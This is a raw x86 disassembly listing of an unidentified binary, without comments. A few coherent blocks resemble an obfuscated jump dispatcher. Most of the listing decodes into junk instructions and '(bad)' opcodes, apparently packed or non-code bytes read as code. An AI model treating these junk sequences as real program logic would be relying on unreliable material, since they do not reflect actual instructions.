  405936:	cs push 0xab6366d4
  40593c:	test   al,0x42
  40593e:	xor    ebx,ebp
  405940:	outs   dx,BYTE PTR ds:[esi]
  405941:	jle    0x405954
  405943:	inc    eax
  405944:	mov    dl,0xb5
  405946:	dec    edx
  405947:	xlat   BYTE PTR ds:[ebx]
  405948:	dec    esi
  405949:	cld    
  40594a:	pop    ebx
  40594b:	jmp    0x4059a0
  40594d:	ret    
  40594e:	inc    ecx
  40594f:	or     DWORD PTR [ecx],edx
  405951:	into   
  405952:	dec    ebx
  405953:	or     al,0xa3
  405955:	arpl   WORD PTR [edi],sp
  405957:	add    bh,BYTE PTR [edx]
  405959:	test   BYTE PTR [edx-0x4f],al
  40595c:	jmp    FWORD PTR [ecx]
  40595e:	mov    edx,0xedd26bb2
  405963:	imul   edx,ebp,0xfc3e5161
  405969:	cmp    DWORD PTR [ebx],ebx
  40596b:	jae    0x4059b6
  40596d:	cdq    
  40596e:	and    eax,0x38752dd9
  405973:	xchg   edx,eax
  405974:	jg     0x40595e
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	fild   QWORD PTR [eax+edx*4+0x7e326aa4]
  4059b7:	jle    0x4059ec
  4059b9:	jge    0x405a39
  4059bb:	jle    0x4059f3
  4059bd:	sbb    DWORD PTR [ecx],esp
  4059bf:	sub    ebp,DWORD PTR [esi]
  4059c1:	jbe    0x40596d
  4059c3:	sbb    BYTE PTR [edx-0x4d],cl
  4059c6:	repnz xchg ecx,eax
  4059c8:	fdiv   QWORD PTR [esp+edx*8+0x61bbfbd5]
  4059cf:	sbb    BYTE PTR [eax],0x60
  4059d2:	sbb    ebx,eax
  4059d4:	mov    ecx,fs
  4059d6:	adc    eax,0xcc959683
  4059db:	or     eax,0xbb0a96ab
  4059e0:	mov    edx,0x3e01ebaf
  4059e5:	cmp    BYTE PTR [ebx+edi*8],ah
  4059e8:	adc    eax,0x2add96f2
  4059ed:	ins    DWORD PTR es:[edi],dx
  4059ee:	dec    esi
  4059ef:	daa    
  4059f0:	or     ah,bh
  4059f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f3:	inc    edx
  4059f4:	cmp    al,0xf4
  4059f6:	scas   eax,DWORD PTR es:[edi]
  4059f7:	mov    edx,edx
  4059f9:	fcomp  DWORD PTR [ebx-0x37]
  4059fc:	inc    esp
  4059fd:	inc    edx
  4059fe:	(bad)  
  4059ff:	ficom  DWORD PTR [esi]
  405a01:	mov    dl,BYTE PTR [edx-0x39]
  405a04:	addr16 push esp
  405a06:	ret    
  405a07:	(bad)  
  405a08:	enter  0x4175,0xcd
  405a0c:	ds jo  0x4059a6
  405a0f:	jg     0x405a3b
  405a11:	addr16 in al,dx
  405a13:	xor    eax,0xaaee006b
  405a18:	mov    ah,0xe4
  405a1a:	sbb    DWORD PTR [eax-0x7bb0933d],ebp
  405a20:	cmp    dl,BYTE PTR [ebx]
  405a22:	dec    esp
  405a23:	mov    ds:0x78ebf9ed,eax
  405a28:	imul   edx,DWORD PTR [eax+0x48c53c95],0xcfc7b36a
  405a32:	adc    DWORD PTR ds:0xdfbba5f1,ebp
  405a38:	(bad)
  405a3c:	cmp    al,0xdc
  405a3e:	imul   edx,DWORD PTR [edi-0x752d40ca],0x438235ab
  405a48:	stc    
  405a49:	(bad)
  405a4c:	dec    edx
  405a4d:	cdq    
  405a4e:	stc    
  405a4f:	and    al,0x4b
  405a51:	mov    BYTE PTR [ecx-0x115c4a09],dh
  405a57:	sub    dh,ah
  405a59:	icebp  
  405a5a:	out    0x61,eax
  405a5c:	jmp    0xb134:0x20e6272d
  405a63:	mov    ebp,DWORD PTR [ecx]
  405a65:	mov    ebp,0x657ea923
  405a6a:	dec    esi
  405a6b:	pop    esp
  405a6c:	shl    BYTE PTR [eax],cl
  405a6e:	jae    0x405abe
  405a70:	sub    eax,0x17680f13
  405a75:	gs add al,al
  405a78:	mov    DWORD PTR [esi+0x3e733e25],ebp
  405a7e:	xor    DWORD PTR [ebx-0x782b88dc],ecx
  405a84:	xchg   edi,eax
  405a85:	lahf   
  405a86:	lods   eax,DWORD PTR ds:[esi]
  405a87:	icebp  
  405a88:	(bad)  
  405a89:	or     al,0x62
  405a8b:	pop    es
  405a8c:	or     BYTE PTR [ecx+ebx*4-0x75],ch
  405a90:	in     al,dx
  405a91:	shl    BYTE PTR [esi-0x9],cl
  405a94:	mov    al,ds:0x4a64369f
  405a99:	cs and ebx,esp
  405a9c:	adc    al,0x9f
  405a9e:	mov    ah,0x6f
  405aa0:	push   cs
  405aa1:	mov    ah,0x9
  405aa3:	dec    esp
  405aa4:	shr    dh,0xa6
  405aa7:	and    DWORD PTR [esi],ebx
  405aa9:	fsub   st,st(0)
  405aab:	in     al,dx
  405aac:	xadd   DWORD PTR [eax+ebp*4],ebp
  405ab0:	cmp    al,0x4a
  405ab2:	xor    al,0x4d
  405ab4:	out    0x77,eax
  405ab6:	je     0x405ac2
  405ab8:	pop    esi
  405ab9:	jno    0x405ab1
  405abb:	inc    ebp
  405abc:	xor    ebp,DWORD PTR [eax]
  405abe:	call   0xc61feb4e
  405ac3:	jg     0x405ad7
  405ac5:	xchg   DWORD PTR es:[edi+0x1701f9c0],ecx
  405acc:	outs   dx,BYTE PTR ds:[esi]
  405acd:	aad    0x81
  405acf:	sbb    BYTE PTR [ebp+ebp*1+0x7e],dl
  405ad3:	mov    ds:0x61dd533f,al
  405ad8:	jbe    0x405b4f
  405ada:	dec    esp
  405adb:	(bad)  
  405adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405add:	or     eax,0x88086a15
  405ae2:	pusha  
  405ae3:	int    0x66
  405ae5:	repz jns 0x405a72
  405ae8:	in     al,0x92
  405aea:	clc    
  405aeb:	sub    DWORD PTR [ecx+0x25],0xef73e9f9
  405af2:	xchg   esi,eax
  405af3:	stc    
  405af4:	retf   
  405af5:	das    
  405af6:	pop    eax
  405af7:	rcr    esi,cl
  405af9:	push   esi
  405afa:	pop    ebx
  405afb:	or     al,0xcb
  405afd:	icebp  
  405afe:	jge    0x405ad8
  405b00:	push   ecx
  405b01:	cld    
  405b02:	call   0xd2dc:0xc7c7cf07
  405b09:	int    0x59
  405b0b:	out    0xc2,eax
  405b0d:	adc    eax,0x12f8cb69
  405b12:	xchg   edx,eax
  405b13:	jp     0x405aef
  405b15:	xchg   edi,eax
  405b16:	ins    BYTE PTR es:[edi],dx
  405b17:	(bad)  [ecx]
  405b19:	push   es
  405b1a:	and    edi,DWORD PTR [edi]
  405b1c:	xchg   esp,eax
  405b1d:	ins    DWORD PTR es:[edi],dx
  405b1e:	(bad)  
  405b1f:	jmp    0x405b0d
  405b21:	pop    edx
  405b22:	xor    eax,0xaf5b812d
  405b27:	cmp    bl,BYTE PTR [eax+0x3d]
  405b2a:	or     bl,0xc7
  405b2d:	xchg   ecx,eax
  405b2e:	in     eax,0xa5
  405b30:	xor    DWORD PTR [eax+0x450c3b89],0x706267b3
  405b3a:	mov    al,0xa4
  405b3c:	add    bh,dh
  405b3e:	jecxz  0x405b9c
  405b40:	jb     0x405ae9
  405b42:	jle    0x405ba8
  405b44:	je     0x405b41
  405b46:	mov    dh,0x5f
  405b48:	dec    edx
  405b49:	leave  
  405b4a:	lahf   
  405b4b:	xor    DWORD PTR [edi],edi
  405b4d:	pop    ds
  405b4e:	lods   al,BYTE PTR ds:[esi]
  405b4f:	retf   0x9f2
  405b52:	xchg   edx,eax
  405b53:	idiv   edi
  405b55:	jmp    DWORD PTR [eax]
  405b57:	call   0xb849bf07
  405b5c:	push   cs
  405b5d:	cmp    BYTE PTR [ecx+0x318b667a],al
  405b63:	xor    dl,BYTE PTR [ebp+0x5e]
  405b66:	std    
  405b67:	sti    
  405b68:	pop    ebx
  405b69:	fs pop es
  405b6b:	mov    edi,0x92230034
  405b70:	(bad)  
  405b71:	icebp  
  405b72:	and    WORD PTR fs:[ebp+0x388e4ca2],bx
  405b7a:	dec    esp
  405b7b:	sub    DWORD PTR ds:0x68d7deca,ebp
  405b81:	call   0x5d99:0xf453022d
  405b88:	adc    ah,dl
  405b8a:	ret    0x4948
  405b8d:	leave  
  405b8e:	nop
  405b8f:	cmp    eax,0x24edc44f
  405b94:	data16 ja 0x405b9e
  405b97:	test   dl,bl
  405b99:	test   DWORD PTR [ebx+0x5e0d14a1],ebp
  405b9f:	inc    esp
  405ba0:	sub    DWORD PTR es:[edi+eiz*2],ebx
  405ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba5:	std    
  405ba6:	sub    eax,DWORD PTR [ebx]
  405ba8:	outs   dx,DWORD PTR ds:[esi]
  405ba9:	outs   dx,BYTE PTR ds:[esi]
  405baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bab:	ins    BYTE PTR es:[edi],dx
  405bac:	adc    al,0xb8
  405bae:	addr16 pop edi
  405bb0:	pop    esp
  405bb1:	in     eax,dx
  405bb2:	push   0xfffffffe
  405bb4:	xchg   edx,eax
  405bb5:	gs inc esi
  405bb7:	nop
  405bb8:	xchg   BYTE PTR [esi+0x5b29eaad],dh
  405bbe:	adc    al,0x65
  405bc0:	(bad)  
  405bc1:	in     al,0xc5
  405bc3:	sbb    eax,0xcfb8b29c
  405bc8:	neg    DWORD PTR [ecx-0x23]
  405bcb:	push   0x6dd0a574
  405bd0:	mov    esi,0x6dc9f3ae
  405bd5:	dec    ecx
  405bd6:	or     al,BYTE PTR [ebx+0x47853ea5]
  405bdc:	adc    DWORD PTR [ecx],ebx
  405bde:	mov    edx,0x9dbc373
  405be3:	jle    0x405c1a
  405be5:	aaa    
  405be6:	frstor [ebx-0x1340a76b]
  405bec:	sahf   
  405bed:	bound  ebp,QWORD PTR [ebx+esi*4+0x760b020e]
  405bf4:	in     al,dx
  405bf5:	or     DWORD PTR [ebx-0x997c0b0],eax
  405bfb:	scas   eax,DWORD PTR es:[edi]
  405bfc:	fistp  DWORD PTR [esi]
  405bfe:	sub    BYTE PTR [esi],ah
  405c00:	mov    ebp,0x58b1a062
  405c05:	mov    eax,ds:0x5a85c413
  405c0a:	sub    DWORD PTR [eax+0x4cc8ac78],ebp
  405c10:	retf   
  405c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c12:	cmp    edi,DWORD PTR cs:[ebx]
  405c15:	shr    DWORD PTR [ecx+0x43f4bd75],1
  405c1b:	xchg   edi,esi
  405c1d:	dec    ecx
  405c1e:	(bad)  
  405c1f:	addr16 and ecx,eax
  405c22:	cmp    cl,dh
  405c24:	add    BYTE PTR [eax],dh
  405c26:	lods   eax,DWORD PTR ds:[esi]
  405c27:	or     DWORD PTR ds:0xcdf9d11a,edx
  405c2d:	jo     0x405c99
  405c2f:	arpl   WORD PTR [eax+ecx*8+0xcd3bef6],di
  405c36:	sub    eax,DWORD PTR [ebx]
  405c38:	cld    
  405c39:	add    bh,BYTE PTR [ebp-0x4829fe5d]
  405c3f:	retf   
  405c40:	lods   eax,DWORD PTR ds:[esi]
  405c41:	xlat   BYTE PTR ds:[ebx]
  405c42:	mov    esi,0xe193466b
  405c47:	sbb    dh,dl
  405c49:	lods   al,BYTE PTR ds:[esi]
  405c4a:	cmp    al,0x3b
  405c4c:	lock push ss
  405c4e:	xchg   ecx,eax
  405c4f:	out    0xb,al
  405c51:	jno    0x405cbb
  405c53:	pop    edx
  405c54:	dec    esi
  405c55:	pop    ds
  405c56:	sahf   
  405c57:	ret    
  405c58:	xchg   edi,eax
  405c59:	mov    eax,0x92315e3c
  405c5e:	les    ebp,FWORD PTR [edx]
  405c60:	mov    cl,0xf8
  405c62:	jmp    0xb002b663
  405c67:	lock cdq 
  405c69:	sub    BYTE PTR [ecx],al
  405c6b:	xchg   edi,eax
  405c6c:	xor    BYTE PTR [esi-0x44],ch
  405c6f:	popf   
  405c70:	or     edx,DWORD PTR [eax]
  405c72:	push   es
  405c73:	push   0xffffffa7
  405c75:	sti    
  405c76:	and    DWORD PTR [edi+0x4f65e131],edx
  405c7c:	mov    al,ds:0x29468c81
  405c81:	test   BYTE PTR [edx-0x1e],al
  405c84:	mov    dl,0xbf
  405c86:	retf   0x3999
  405c89:	adc    BYTE PTR [eax],dl
  405c8b:	xchg   esp,eax
  405c8c:	inc    cx
  405c8e:	mov    esi,0x3522e547
  405c93:	cmp    BYTE PTR [edi],ah
  405c95:	mov    ecx,0x360773d7
  405c9a:	(bad)  
  405c9b:	sbb    al,0x2
  405c9d:	jmp    0x405ce5
  405c9f:	(bad)  
  405ca1:	mov    ebx,0x9f509779
  405ca6:	push   cs
  405ca7:	cs repz add dh,bh
  405cab:	cli    
  405cac:	mov    esi,0x85b42ec1
  405cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb2:	lock inc edx
  405cb4:	cmp    DWORD PTR [esi-0x63d3fb1a],edx
  405cba:	ja     0x405c5d
  405cbc:	into   
  405cbd:	mov    edi,0xf172089e
  405cc2:	aas    
  405cc3:	mov    edi,?
  405cc5:	sbb    DWORD PTR [esi-0x43],0xfffffff4
  405cc9:	adc    BYTE PTR [edi],ch
  405ccb:	jne    0x405c98
  405ccd:	and    edi,DWORD PTR [esi-0x6377df97]
  405cd3:	loop   0x405d0f
  405cd5:	(bad)  
  405cd9:	bnd jle 0x405c65
  405cdc:	out    dx,eax
  405cdd:	xchg   DWORD PTR [edi],ebx
  405cdf:	adc    BYTE PTR [ebx],bl
  405ce1:	mov    al,BYTE PTR ds:0x55a8b5d
  405ce7:	fist   WORD PTR [ebx]
  405ce9:	cli    
  405cea:	outs   dx,BYTE PTR ds:[esi]
  405ceb:	pop    edi
  405cec:	out    dx,eax
  405ced:	aaa    
  405cee:	in     al,dx
  405cef:	imul   ebp,DWORD PTR [eax],0x23
  405cf2:	sar    BYTE PTR [edx-0x42468a87],0x86
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	sub    cl,dl
  405d2d:	adc    BYTE PTR [eax+0x2f],al
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405d13
  405d38:	cmp    DWORD PTR [eax-0x73],ebx
  405d3b:	or     DWORD PTR cs:[eax+0x440831fd],edi
  405d42:	and    esi,DWORD PTR [eax+0x6b]
  405d45:	mov    al,ds:0xf889228e
  405d4a:	repz jbe 0x405d9d
  405d4d:	dec    ebx
  405d4e:	pop    ecx
  405d4f:	(bad)  [edi-0x6526c24d]
  405d55:	mov    ds:0x10c6af6d,eax
  405d5a:	jmp    0xb2aa:0x5277d3e
  405d61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d62:	lods   eax,DWORD PTR ds:[esi]
  405d63:	out    dx,eax
  405d64:	out    dx,al
  405d65:	ins    BYTE PTR es:[edi],dx
  405d66:	pop    esp
  405d67:	mov    dl,al
  405d69:	jnp    0x405d65
  405d6b:	scas   al,BYTE PTR es:[edi]
  405d6c:	es add ebp,ebp
  405d6f:	jge    0x405dca
  405d71:	pop    edi
  405d72:	inc    eax
  405d73:	mov    BYTE PTR [ecx],ah
  405d75:	jg     0x405d41
  405d77:	adc    bh,bl
  405d79:	test   al,0x9
  405d7b:	inc    ebp
  405d7c:	(bad)  
  405d7d:	clc    
  405d7e:	lods   eax,DWORD PTR ds:[esi]
  405d7f:	mov    WORD PTR [ecx],?
  405d81:	and    BYTE PTR [ebp+0x1bd7e984],al
  405d87:	or     ebx,ebp
  405d89:	sbb    BYTE PTR [ebp-0x51],0xa
  405d8d:	ja     0x405d8d
  405d8f:	jg     0x405dde
  405d91:	mov    edx,0xab8294e3
  405d96:	adc    edx,DWORD PTR [ebx-0x25f136b1]
  405d9c:	dec    esp
  405d9d:	push   eax
  405d9e:	pop    ss
  405d9f:	jmp    0x785f:0xaa98f260
  405da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405da7:	test   al,0xfb
  405da9:	sbb    DWORD PTR [ecx+0x2438c94f],eax
  405daf:	iret   
  405db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405db1:	loop   0x405dab
  405db3:	mov    fs,ebx
  405db5:	pop    edx
  405db6:	jb     0x405da3
  405db8:	sub    DWORD PTR [edx-0x66],ecx
  405dbb:	xlat   BYTE PTR ds:[ebx]
  405dbc:	jo     0x405e14
  405dbe:	pop    ss
  405dbf:	pop    esp
  405dc0:	mov    bl,0x54
  405dc2:	fxch   st(5)
  405dc4:	sti    
  405dc5:	(bad)  
  405dc6:	not    BYTE PTR [esi]
  405dc8:	xchg   ecx,eax
  405dc9:	fdivr  DWORD PTR [edx+edi*4+0x1e5dab3b]
  405dd0:	push   edi
  405dd1:	push   ss
  405dd2:	arpl   WORD PTR [esi+ebp*1-0x6],cx
  405dd6:	xchg   ebx,eax
  405dd7:	push   ss
  405dd8:	cmp    esi,edx
  405dda:	mov    ds:0x9e5fc797,eax
  405ddf:	loope  0x405d9e
  405de1:	(bad)  
  405de3:	sbb    edx,DWORD PTR [eax]
  405de5:	rcl    eax,1
  405de7:	pop    edx
  405de8:	das    
  405de9:	lea    ecx,[esi+0x3a4058b1]
  405def:	push   es
  405df0:	outs   dx,DWORD PTR ds:[esi]
  405df1:	cmp    esp,ebx
  405df3:	jmp    ecx
  405df5:	inc    ecx
  405df6:	ss jbe 0x405e72
  405df9:	shr    DWORD PTR [esi+edi*1],cl
  405dfc:	jmp    0xf430796
  405e01:	pop    ecx
  405e02:	std    
  405e03:	adc    esi,DWORD PTR [eax-0x65238769]
  405e09:	mov    dh,0x44
  405e0b:	jge    0x405dc6
  405e0d:	retf   
  405e0e:	lds    ebp,FWORD PTR [edi-0x782a9bed]
  405e14:	rcr    BYTE PTR [esi],cl
  405e16:	adc    edx,DWORD PTR [ebp-0x78a4b777]
  405e1c:	aam    0x29
  405e1e:	ret    
  405e1f:	adc    al,0xdf
  405e21:	dec    ebx
  405e22:	push   es
  405e23:	adc    al,dl
  405e25:	retf   0x3c2e
  405e28:	and    esp,DWORD PTR [edi-0x71]
  405e2b:	rcr    DWORD PTR [esi+0x7e45cfa9],cl
  405e31:	cmp    ah,BYTE PTR [esi+0x2fb98294]
  405e37:	fdiv   DWORD PTR [edx]
  405e39:	iret   
  405e3a:	sub    bl,cl
  405e3c:	cmc    
  405e3d:	(bad)  
  405e3e:	fistp  QWORD PTR [eax+eiz*8-0x546be8f9]
  405e45:	jmp    0x654e3c54
  405e4a:	or     DWORD PTR [eax-0x29],0x28e0a3be
  405e51:	test   BYTE PTR [eax],cl
  405e53:	add    BYTE PTR [ecx+eax*4+0x15],bh
  405e57:	stos   BYTE PTR es:[edi],al
  405e58:	stos   BYTE PTR es:[edi],al
  405e59:	jl     0x405e17
  405e5b:	test   DWORD PTR ds:0x74e54b5c,edi
  405e61:	vmovhpd xmm6,xmm6,QWORD PTR [eax+0x50]
  405e67:	or     BYTE PTR [esi],ch
  405e69:	or     eax,0x9923d1c9
  405e6e:	dec    esp
  405e6f:	pop    edx
  405e70:	pop    eax
  405e71:	stc    
  405e72:	jne    0x405e46
  405e74:	test   DWORD PTR [ebx],esp
  405e76:	push   ss
  405e77:	add    DWORD PTR [esi+0x6bd36cf1],edi
  405e7d:	jns    0x405ef1
  405e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e80:	inc    edi
  405e81:	rcr    DWORD PTR [ebp-0x56c5a790],0x4
  405e88:	xchg   BYTE PTR [esi+0x780e30f0],ch
  405e8e:	pop    esi
  405e8f:	dec    ebx
  405e90:	fs aaa 
  405e92:	lock add eax,0xe5112637
  405e98:	push   ecx
  405e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e9a:	push   0xc3af37ec
  405e9f:	xor    al,0xc9
  405ea1:	sbb    bl,BYTE PTR [ecx]
  405ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ea4:	mov    cs,esp
  405ea6:	int3   
  405ea7:	xor    BYTE PTR [esi],bl
  405ea9:	jp     0x405e79
  405eab:	add    DWORD PTR [edi+0x38acaece],edi
  405eb1:	out    dx,al
  405eb2:	mov    bl,0xfd
  405eb4:	(bad)  
  405eb5:	xchg   edi,eax
  405eb6:	jecxz  0x405edd
  405eb8:	cmp    ebx,DWORD PTR [edi-0x46606ae4]
  405ebe:	pop    ecx
  405ebf:	jl     0x405f2e
  405ec1:	mov    dh,0x70
  405ec3:	xor    cl,ch
  405ec5:	cmp    ebx,edx
  405ec7:	aaa    
  405ec8:	dec    edi
  405ec9:	daa    
  405eca:	in     eax,0x6a
  405ecc:	xor    al,0x43
  405ece:	jnp    0x405ed1
  405ed0:	std    
  405ed1:	iret   
  405ed2:	hlt    
  405ed3:	fimul  DWORD PTR [edx-0x43dc3c92]
  405ed9:	sbb    al,0x8c
  405edb:	sub    eax,DWORD PTR [esi]
  405edd:	sbb    DWORD PTR [ecx],esi
  405edf:	push   0xf41d2bd9
  405ee4:	mov    ds,WORD PTR [ecx-0x49ba2e06]
  405eea:	scas   eax,DWORD PTR es:[edi]
  405eeb:	xor    esi,eax
  405eed:	test   DWORD PTR [edx-0x39],ecx
  405ef0:	dec    ebp
  405ef1:	dec    edx
  405ef2:	push   ecx
  405ef3:	push   0xffffffdf
  405ef5:	fadd   QWORD PTR [esi+0x79]
  405ef8:	and    BYTE PTR [edx-0x1bf24552],ch
  405efe:	ja     0x405ef4
  405f00:	sti    
  405f01:	fs push edx
  405f03:	pop    ebx
  405f04:	cmp    al,0x7f
  405f06:	rcl    al,1
  405f08:	mov    bh,0x9d
  405f0a:	sti    
  405f0b:	add    ebx,DWORD PTR [edi+edx*8]
  405f0e:	int3   
  405f0f:	fistp  WORD PTR [ecx+0x7c]
  405f12:	inc    esp
  405f13:	pop    edi
  405f14:	js     0x405ebf
  405f16:	pop    ebp
  405f17:	repz inc esi
  405f19:	push   0x4f
  405f1b:	les    ebx,FWORD PTR [ebp-0x6]
  405f1e:	adc    bh,BYTE PTR [eax-0x6f]
  405f21:	addr16 repnz dec eax
  405f24:	inc    ebp
  405f25:	sti    
  405f26:	loop   0x405f6a
  405f28:	cmp    eax,0xdd29a650
  405f2d:	mov    edx,0xcded62f
  405f32:	das    
  405f33:	arpl   WORD PTR [edi+0x112841f8],si
  405f39:	hlt    
  405f3a:	aad    0x24
  405f3c:	pushf  
  405f3d:	sbb    DWORD PTR [eax-0x4dbdf5ca],ecx
  405f43:	sbb    bh,bh
  405f45:	push   ecx
  405f46:	adc    ecx,DWORD PTR [eax]
  405f48:	pop    esi
  405f49:	stos   BYTE PTR es:[edi],al
  405f4a:	les    ecx,FWORD PTR [ebp+0x44]
  405f4d:	ds push esi
  405f4f:	out    0x25,eax
  405f51:	(bad)  
  405f52:	jge    0x405f91
  405f54:	sbb    al,0x25
  405f56:	jae    0x405f0c
  405f58:	mov    al,ds:0xe883e707
  405f5d:	mov    edx,DWORD PTR [ebx+0x6d0c2fcf]
  405f63:	mov    esp,0xf599222f
  405f68:	loope  0x405f92
  405f6a:	outs   dx,BYTE PTR ds:[esi]
  405f6b:	push   ebp
  405f6c:	fstp   TBYTE PTR [esi+0x3b4a21c9]
  405f72:	shl    BYTE PTR [eax-0x1d682866],1
  405f78:	xchg   DWORD PTR [edi+eiz*1+0x64],edx
  405f7c:	aaa    
  405f7d:	(bad)  [ebx]
  405f7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f80:	add    DWORD PTR [esp+ebp*1+0x34],0x5c253127
  405f88:	inc    esp
  405f89:	mov    cl,0xae
  405f8b:	adc    al,0x4d
  405f8d:	or     al,0x3e
  405f8f:	bound  edx,QWORD PTR [ebx-0x28]
  405f92:	mov    dl,0x31
  405f94:	outs   dx,DWORD PTR ds:[esi]
  405f95:	out    0xa2,eax
  405f97:	jae    0x405f5e
  405f99:	mov    ecx,DWORD PTR [ecx]
  405f9b:	je     0x405f94
  405f9d:	das    
  405f9e:	(bad)  
  405fa0:	out    dx,eax
  405fa1:	mov    edx,0x4b0ae92b
  405fa6:	dec    ebx
  405fa7:	test   al,0x5f
  405fa9:	dec    ebp
  405faa:	mov    ds:0xc82c6ca6,al
  405faf:	or     ebx,DWORD PTR [esi]
  405fb1:	xchg   esp,eax
  405fb2:	jns    0x40600f
  405fb4:	fs in  eax,0xbd
  405fb7:	retf   
  405fb8:	adc    bh,cl
  405fba:	loopne 0x406026
  405fbc:	inc    esi
  405fbd:	and    dl,BYTE PTR [esi-0x8a50e1b]
  405fc3:	cmp    ebp,DWORD PTR [edi+0x1f]
  405fc6:	out    dx,eax
  405fc7:	popa   
  405fc8:	mov    ebp,0xb31876fe
  405fcd:	jbe    0x405ffc
  405fcf:	sbb    BYTE PTR [eax+0x3374d423],cl
  405fd5:	jmp    0xec535883
  405fda:	push   ebp
  405fdb:	add    ebx,DWORD PTR [ebx-0xa]
  405fde:	xchg   edx,eax
  405fdf:	or     esi,DWORD PTR [eax+0x68dbe9b9]
  405fe5:	add    eax,0xbe20ef53
  405fea:	(bad)  
  405feb:	push   0x14e439ae
  405ff0:	int    0xc1
  405ff2:	outs   dx,DWORD PTR ds:[esi]
  405ff3:	adc    ah,BYTE PTR [eax-0x3a]
  405ff6:	push   eax
  405ff7:	mov    edx,0x441a78f
  405ffc:	in     eax,dx
  405ffd:	and    dh,BYTE PTR [eax+0xb62b1be]
  406003:	inc    eax
  406004:	mov    DWORD PTR [edx+edx*8-0x77],ecx
  406008:	pushf  
  406009:	and    BYTE PTR [esi+0x2e707406],ah
  40600f:	fisubr WORD PTR [ecx+0x4fa74219]
  406015:	fisttp DWORD PTR [edi]
  406017:	out    0xa9,eax
  406019:	xor    BYTE PTR [ecx-0x70c2a21d],dh
  40601f:	adc    ebx,DWORD PTR [ecx+0x2702c1df]
  406025:	imul   esi,ebx,0x57ccd6ba
  40602b:	not    BYTE PTR [ebp+0x7b]
  40602e:	fwait
  40602f:	push   0x11293235
  406034:	xor    DWORD PTR [ebp-0x3e28c998],edx
  40603a:	fs adc al,0x73
  40603d:	or     eax,0x8913a57b
  406042:	aaa    
  406043:	fcom   DWORD PTR [edi]
  406045:	ret    
  406046:	scas   eax,DWORD PTR es:[edi]
  406047:	adc    edi,DWORD PTR [ebp-0x1e376a56]
  40604d:	jp     0x40605f
  40604f:	pop    DWORD PTR [eax+ebx*4]
  406052:	cmp    eax,0x9bc2ceb5
  406057:	sub    ch,ch
  406059:	ja     0x4060d4
  40605b:	mov    al,ds:0x91e5c3d8
  406060:	dec    esp
  406061:	in     al,0x89
  406063:	pusha  
  406064:	add    eax,0x8d45a51
  406069:	xor    al,0x3
  40606b:	mov    ds:0x42f5f86e,eax
  406070:	bound  edi,QWORD PTR ds:0xda3b968c
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xac
  40608b:	in     eax,dx
  40608c:	test   eax,0x7e3de09a
  406091:	jle    0x4060c6
  406093:	jge    0x406113
  406095:	jle    0x40602f
  406097:	jne    0x4060af
  406099:	in     al,0xa0
  40609b:	repz je 0x406092
  40609e:	pop    edi
  40609f:	mov    dl,0xa2
  4060a1:	(bad)  
  4060a2:	dec    esi
  4060a3:	mov    ds:0x18e3640c,al
  4060a8:	sbb    DWORD PTR [eax+0x45],0xfffffff5
  4060ac:	sub    ecx,esp
  4060ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060af:	fisub  WORD PTR [edi+0x64]
  4060b2:	lahf   
  4060b3:	push   ebx
  4060b4:	mov    bl,al
  4060b6:	jmp    edi
  4060b8:	xor    edx,eax
  4060ba:	mov    ch,0xce
  4060bc:	mov    ds:0xf3ceee8c,al
  4060c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060c2:	sbb    al,0xcb
  4060c4:	add    ebp,ecx
  4060c6:	cmp    cl,BYTE PTR [edi-0x30]
  4060c9:	inc    eax
  4060ca:	mov    eax,ds:0xa84bc0b3
  4060cf:	mov    ecx,esp
  4060d1:	dec    edx
  4060d2:	lds    ecx,FWORD PTR [edx-0x127e2029]
  4060d8:	mov    dh,0xe0
  4060da:	out    0x9c,al
  4060dc:	mov    eax,0x86dd464a
  4060e1:	dec    esi
  4060e2:	and    dl,ah
